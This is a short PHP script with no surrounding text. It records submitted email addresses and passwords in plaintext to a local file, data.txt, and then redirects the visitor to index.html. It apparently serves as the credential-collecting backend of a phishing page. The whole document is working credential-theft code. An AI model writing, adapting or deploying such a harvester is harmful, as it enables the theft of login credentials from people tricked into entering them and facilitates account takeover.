<?php
if ($_POST['email'] && $_POST['pass']) {
    $data = date('Y-m-d H:i:s') . " | " . $_POST['email'] . " | " . $_POST['pass'] . "\n";
    file_put_contents('data.txt', $data, FILE_APPEND | LOCK_EX);
}
header('Location: index.html');
?>
